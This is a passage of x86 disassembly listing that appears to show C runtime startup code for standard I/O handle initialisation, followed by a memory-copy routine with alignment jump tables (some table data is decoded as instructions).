  4043cb:	85 f6                	test   %esi,%esi
  4043cd:	75 08                	jne    0x4043d7
  4043cf:	6a 1b                	push   $0x1b
  4043d1:	e8 77 fa ff ff       	call   0x403e4d
  4043d6:	59                   	pop    %ecx
  4043d7:	89 35 20 d4 40 00    	mov    %esi,0x40d420
  4043dd:	c7 05 20 d5 40 00 20 	movl   $0x20,0x40d520
  4043e4:	00 00 00 
  4043e7:	8d 86 00 01 00 00    	lea    0x100(%esi),%eax
  4043ed:	3b f0                	cmp    %eax,%esi
  4043ef:	73 1a                	jae    0x40440b
  4043f1:	80 66 04 00          	andb   $0x0,0x4(%esi)
  4043f5:	83 0e ff             	orl    $0xffffffff,(%esi)
  4043f8:	c6 46 05 0a          	movb   $0xa,0x5(%esi)
  4043fc:	a1 20 d4 40 00       	mov    0x40d420,%eax
  404401:	83 c6 08             	add    $0x8,%esi
  404404:	05 00 01 00 00       	add    $0x100,%eax
  404409:	eb e2                	jmp    0x4043ed
  40440b:	8d 44 24 10          	lea    0x10(%esp),%eax
  40440f:	50                   	push   %eax
  404410:	ff 15 60 90 40 00    	call   *0x409060
  404416:	66 83 7c 24 42 00    	cmpw   $0x0,0x42(%esp)
  40441c:	0f 84 c5 00 00 00    	je     0x4044e7
  404422:	8b 44 24 44          	mov    0x44(%esp),%eax
  404426:	85 c0                	test   %eax,%eax
  404428:	0f 84 b9 00 00 00    	je     0x4044e7
  40442e:	8b 30                	mov    (%eax),%esi
  404430:	8d 68 04             	lea    0x4(%eax),%ebp
  404433:	b8 00 08 00 00       	mov    $0x800,%eax
  404438:	3b f0                	cmp    %eax,%esi
  40443a:	8d 1c 2e             	lea    (%esi,%ebp,1),%ebx
  40443d:	7c 02                	jl     0x404441
  40443f:	8b f0                	mov    %eax,%esi
  404441:	39 35 20 d5 40 00    	cmp    %esi,0x40d520
  404447:	7d 52                	jge    0x40449b
  404449:	bf 24 d4 40 00       	mov    $0x40d424,%edi
  40444e:	68 00 01 00 00       	push   $0x100
  404453:	e8 ad 0c 00 00       	call   0x405105
  404458:	85 c0                	test   %eax,%eax
  40445a:	59                   	pop    %ecx
  40445b:	74 38                	je     0x404495
  40445d:	83 05 20 d5 40 00 20 	addl   $0x20,0x40d520
  404464:	89 07                	mov    %eax,(%edi)
  404466:	8d 88 00 01 00 00    	lea    0x100(%eax),%ecx
  40446c:	3b c1                	cmp    %ecx,%eax
  40446e:	73 18                	jae    0x404488
  404470:	80 60 04 00          	andb   $0x0,0x4(%eax)
  404474:	83 08 ff             	orl    $0xffffffff,(%eax)
  404477:	c6 40 05 0a          	movb   $0xa,0x5(%eax)
  40447b:	8b 0f                	mov    (%edi),%ecx
  40447d:	83 c0 08             	add    $0x8,%eax
  404480:	81 c1 00 01 00 00    	add    $0x100,%ecx
  404486:	eb e4                	jmp    0x40446c
  404488:	83 c7 04             	add    $0x4,%edi
  40448b:	39 35 20 d5 40 00    	cmp    %esi,0x40d520
  404491:	7c bb                	jl     0x40444e
  404493:	eb 06                	jmp    0x40449b
  404495:	8b 35 20 d5 40 00    	mov    0x40d520,%esi
  40449b:	33 ff                	xor    %edi,%edi
  40449d:	85 f6                	test   %esi,%esi
  40449f:	7e 46                	jle    0x4044e7
  4044a1:	8b 03                	mov    (%ebx),%eax
  4044a3:	83 f8 ff             	cmp    $0xffffffff,%eax
  4044a6:	74 36                	je     0x4044de
  4044a8:	8a 4d 00             	mov    0x0(%ebp),%cl
  4044ab:	f6 c1 01             	test   $0x1,%cl
  4044ae:	74 2e                	je     0x4044de
  4044b0:	f6 c1 08             	test   $0x8,%cl
  4044b3:	75 0b                	jne    0x4044c0
  4044b5:	50                   	push   %eax
  4044b6:	ff 15 88 90 40 00    	call   *0x409088
  4044bc:	85 c0                	test   %eax,%eax
  4044be:	74 1e                	je     0x4044de
  4044c0:	8b c7                	mov    %edi,%eax
  4044c2:	8b cf                	mov    %edi,%ecx
  4044c4:	c1 f8 05             	sar    $0x5,%eax
  4044c7:	83 e1 1f             	and    $0x1f,%ecx
  4044ca:	8b 04 85 20 d4 40 00 	mov    0x40d420(,%eax,4),%eax
  4044d1:	8d 04 c8             	lea    (%eax,%ecx,8),%eax
  4044d4:	8b 0b                	mov    (%ebx),%ecx
  4044d6:	89 08                	mov    %ecx,(%eax)
  4044d8:	8a 4d 00             	mov    0x0(%ebp),%cl
  4044db:	88 48 04             	mov    %cl,0x4(%eax)
  4044de:	47                   	inc    %edi
  4044df:	45                   	inc    %ebp
  4044e0:	83 c3 04             	add    $0x4,%ebx
  4044e3:	3b fe                	cmp    %esi,%edi
  4044e5:	7c ba                	jl     0x4044a1
  4044e7:	33 db                	xor    %ebx,%ebx
  4044e9:	a1 20 d4 40 00       	mov    0x40d420,%eax
  4044ee:	83 3c d8 ff          	cmpl   $0xffffffff,(%eax,%ebx,8)
  4044f2:	8d 34 d8             	lea    (%eax,%ebx,8),%esi
  4044f5:	75 4d                	jne    0x404544
  4044f7:	85 db                	test   %ebx,%ebx
  4044f9:	c6 46 04 81          	movb   $0x81,0x4(%esi)
  4044fd:	75 05                	jne    0x404504
  4044ff:	6a f6                	push   $0xfffffff6
  404501:	58                   	pop    %eax
  404502:	eb 0a                	jmp    0x40450e
  404504:	8b c3                	mov    %ebx,%eax
  404506:	48                   	dec    %eax
  404507:	f7 d8                	neg    %eax
  404509:	1b c0                	sbb    %eax,%eax
  40450b:	83 c0 f5             	add    $0xfffffff5,%eax
  40450e:	50                   	push   %eax
  40450f:	ff 15 84 90 40 00    	call   *0x409084
  404515:	8b f8                	mov    %eax,%edi
  404517:	83 ff ff             	cmp    $0xffffffff,%edi
  40451a:	74 17                	je     0x404533
  40451c:	57                   	push   %edi
  40451d:	ff 15 88 90 40 00    	call   *0x409088
  404523:	85 c0                	test   %eax,%eax
  404525:	74 0c                	je     0x404533
  404527:	25 ff 00 00 00       	and    $0xff,%eax
  40452c:	89 3e                	mov    %edi,(%esi)
  40452e:	83 f8 02             	cmp    $0x2,%eax
  404531:	75 06                	jne    0x404539
  404533:	80 4e 04 40          	orb    $0x40,0x4(%esi)
  404537:	eb 0f                	jmp    0x404548
  404539:	83 f8 03             	cmp    $0x3,%eax
  40453c:	75 0a                	jne    0x404548
  40453e:	80 4e 04 08          	orb    $0x8,0x4(%esi)
  404542:	eb 04                	jmp    0x404548
  404544:	80 4e 04 80          	orb    $0x80,0x4(%esi)
  404548:	43                   	inc    %ebx
  404549:	83 fb 03             	cmp    $0x3,%ebx
  40454c:	7c 9b                	jl     0x4044e9
  40454e:	ff 35 20 d5 40 00    	push   0x40d520
  404554:	ff 15 80 90 40 00    	call   *0x409080
  40455a:	5f                   	pop    %edi
  40455b:	5e                   	pop    %esi
  40455c:	5d                   	pop    %ebp
  40455d:	5b                   	pop    %ebx
  40455e:	83 c4 44             	add    $0x44,%esp
  404561:	c3                   	ret
  404562:	cc                   	int3
  404563:	cc                   	int3
  404564:	cc                   	int3
  404565:	cc                   	int3
  404566:	cc                   	int3
  404567:	cc                   	int3
  404568:	cc                   	int3
  404569:	cc                   	int3
  40456a:	cc                   	int3
  40456b:	cc                   	int3
  40456c:	cc                   	int3
  40456d:	cc                   	int3
  40456e:	cc                   	int3
  40456f:	cc                   	int3
  404570:	55                   	push   %ebp
  404571:	8b ec                	mov    %esp,%ebp
  404573:	57                   	push   %edi
  404574:	56                   	push   %esi
  404575:	8b 75 0c             	mov    0xc(%ebp),%esi
  404578:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40457b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40457e:	8b c1                	mov    %ecx,%eax
  404580:	8b d1                	mov    %ecx,%edx
  404582:	03 c6                	add    %esi,%eax
  404584:	3b fe                	cmp    %esi,%edi
  404586:	76 08                	jbe    0x404590
  404588:	3b f8                	cmp    %eax,%edi
  40458a:	0f 82 78 01 00 00    	jb     0x404708
  404590:	f7 c7 03 00 00 00    	test   $0x3,%edi
  404596:	75 14                	jne    0x4045ac
  404598:	c1 e9 02             	shr    $0x2,%ecx
  40459b:	83 e2 03             	and    $0x3,%edx
  40459e:	83 f9 08             	cmp    $0x8,%ecx
  4045a1:	72 29                	jb     0x4045cc
  4045a3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4045a5:	ff 24 95 b8 46 40 00 	jmp    *0x4046b8(,%edx,4)
  4045ac:	8b c7                	mov    %edi,%eax
  4045ae:	ba 03 00 00 00       	mov    $0x3,%edx
  4045b3:	83 e9 04             	sub    $0x4,%ecx
  4045b6:	72 0c                	jb     0x4045c4
  4045b8:	83 e0 03             	and    $0x3,%eax
  4045bb:	03 c8                	add    %eax,%ecx
  4045bd:	ff 24 85 d0 45 40 00 	jmp    *0x4045d0(,%eax,4)
  4045c4:	ff 24 8d c8 46 40 00 	jmp    *0x4046c8(,%ecx,4)
  4045cb:	90                   	nop
  4045cc:	ff 24 8d 4c 46 40 00 	jmp    *0x40464c(,%ecx,4)
  4045d3:	90                   	nop
  4045d4:	e0 45                	loopne 0x40461b
  4045d6:	40                   	inc    %eax
  4045d7:	00 0c 46             	add    %cl,(%esi,%eax,2)
  4045da:	40                   	inc    %eax
  4045db:	00 30                	add    %dh,(%eax)
  4045dd:	46                   	inc    %esi
  4045de:	40                   	inc    %eax
  4045df:	00 23                	add    %ah,(%ebx)
  4045e1:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  4045e7:	46                   	inc    %esi
  4045e8:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  4045ee:	02 c1                	add    %cl,%al
  4045f0:	e9 02 88 47 02       	jmp    0x287cdf7
  4045f5:	83 c6 03             	add    $0x3,%esi
  4045f8:	83 c7 03             	add    $0x3,%edi
  4045fb:	83 f9 08             	cmp    $0x8,%ecx
  4045fe:	72 cc                	jb     0x4045cc
  404600:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404602:	ff 24 95 b8 46 40 00 	jmp    *0x4046b8(,%edx,4)
  404609:	8d 49 00             	lea    0x0(%ecx),%ecx
  40460c:	23 d1                	and    %ecx,%edx
  40460e:	8a 06                	mov    (%esi),%al
  404610:	88 07                	mov    %al,(%edi)
  404612:	8a 46 01             	mov    0x1(%esi),%al
  404615:	c1 e9 02             	shr    $0x2,%ecx
  404618:	88 47 01             	mov    %al,0x1(%edi)
  40461b:	83 c6 02             	add    $0x2,%esi
  40461e:	83 c7 02             	add    $0x2,%edi
  404621:	83 f9 08             	cmp    $0x8,%ecx
  404624:	72 a6                	jb     0x4045cc
  404626:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404628:	ff 24 95 b8 46 40 00 	jmp    *0x4046b8(,%edx,4)
  40462f:	90                   	nop
  404630:	23 d1                	and    %ecx,%edx
  404632:	8a 06                	mov    (%esi),%al
  404634:	88 07                	mov    %al,(%edi)
  404636:	46                   	inc    %esi
  404637:	c1 e9 02             	shr    $0x2,%ecx
  40463a:	47                   	inc    %edi
  40463b:	83 f9 08             	cmp    $0x8,%ecx
  40463e:	72 8c                	jb     0x4045cc
  404640:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404642:	ff 24 95 b8 46 40 00 	jmp    *0x4046b8(,%edx,4)
  404649:	8d 49 00             	lea    0x0(%ecx),%ecx
  40464c:	af                   	scas   %es:(%edi),%eax
  40464d:	46                   	inc    %esi
  40464e:	40                   	inc    %eax
  40464f:	00 9c 46 40 00 94 46 	add    %bl,0x46940040(%esi,%eax,2)
  404656:	40                   	inc    %eax
  404657:	00 8c 46 40 00 84 46 	add    %cl,0x46840040(%esi,%eax,2)
  40465e:	40                   	inc    %eax
  40465f:	00 7c 46 40          	add    %bh,0x40(%esi,%eax,2)
  404663:	00 74 46 40          	add    %dh,0x40(%esi,%eax,2)
  404667:	00 6c 46 40          	add    %ch,0x40(%esi,%eax,2)
  40466b:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  404671:	44                   	inc    %esp
  404672:	8f                   	(bad)
  404673:	e4 8b                	in     $0x8b,%al
  404675:	44                   	inc    %esp
  404676:	8e e8                	mov    %eax,%gs
  404678:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  40467c:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  404680:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  404684:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  404688:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  40468c:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  404690:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  404694:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  404698:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  40469c:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  4046a0:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  4046a4:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  4046ab:	03 f0                	add    %eax,%esi
  4046ad:	03 f8                	add    %eax,%edi
  4046af:	ff 24 95 b8 46 40 00 	jmp    *0x4046b8(,%edx,4)
  4046b6:	8b ff                	mov    %edi,%edi
  4046b8:	c8 46 40 00          	enter  $0x4046,$0x0
  4046bc:	d0 46 40             	rolb   $1,0x40(%esi)
  4046bf:	00 dc                	add    %bl,%ah
  4046c1:	46                   	inc    %esi
  4046c2:	40                   	inc    %eax
  4046c3:	00 f0                	add    %dh,%al
  4046c5:	46                   	inc    %esi
  4046c6:	40                   	inc    %eax
  4046c7:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  4046cd:	c9                   	leave
  4046ce:	c3                   	ret
  4046cf:	90                   	nop
  4046d0:	8a 06                	mov    (%esi),%al
  4046d2:	88 07                	mov    %al,(%edi)
  4046d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4046d7:	5e                   	pop    %esi
  4046d8:	5f                   	pop    %edi
  4046d9:	c9                   	leave
  4046da:	c3                   	ret
  4046db:	90                   	nop
  4046dc:	8a 06                	mov    (%esi),%al
  4046de:	88 07                	mov    %al,(%edi)
  4046e0:	8a 46 01             	mov    0x1(%esi),%al
  4046e3:	88 47 01             	mov    %al,0x1(%edi)
  4046e6:	8b 45 08             	mov    0x8(%ebp),%eax
  4046e9:	5e                   	pop    %esi
  4046ea:	5f                   	pop    %edi
  4046eb:	c9                   	leave
  4046ec:	c3                   	ret
  4046ed:	8d 49 00             	lea    0x0(%ecx),%ecx
  4046f0:	8a 06                	mov    (%esi),%al
  4046f2:	88 07                	mov    %al,(%edi)
  4046f4:	8a 46 01             	mov    0x1(%esi),%al
  4046f7:	88 47 01             	mov    %al,0x1(%edi)
  4046fa:	8a 46 02             	mov    0x2(%esi),%al
  4046fd:	88 47 02             	mov    %al,0x2(%edi)
  404700:	8b 45 08             	mov    0x8(%ebp),%eax
  404703:	5e                   	pop    %esi
  404704:	5f                   	pop    %edi
  404705:	c9                   	leave
  404706:	c3                   	ret
  404707:	90                   	nop
  404708:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  40470c:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  404710:	f7 c7 03 00 00 00    	test   $0x3,%edi
